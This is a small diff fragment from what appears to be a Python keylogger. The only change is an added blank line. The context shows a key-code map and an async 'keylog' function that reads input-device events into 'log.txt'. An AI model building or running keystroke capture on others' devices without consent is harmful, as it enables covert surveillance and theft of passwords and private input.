@@ -108,6 +108,7 @@ key_code_map = {
 }
 
 
+
 async def keylog(dev):
     with open('log.txt', 'a+') as f:
         async for event in dev.async_read_loop():
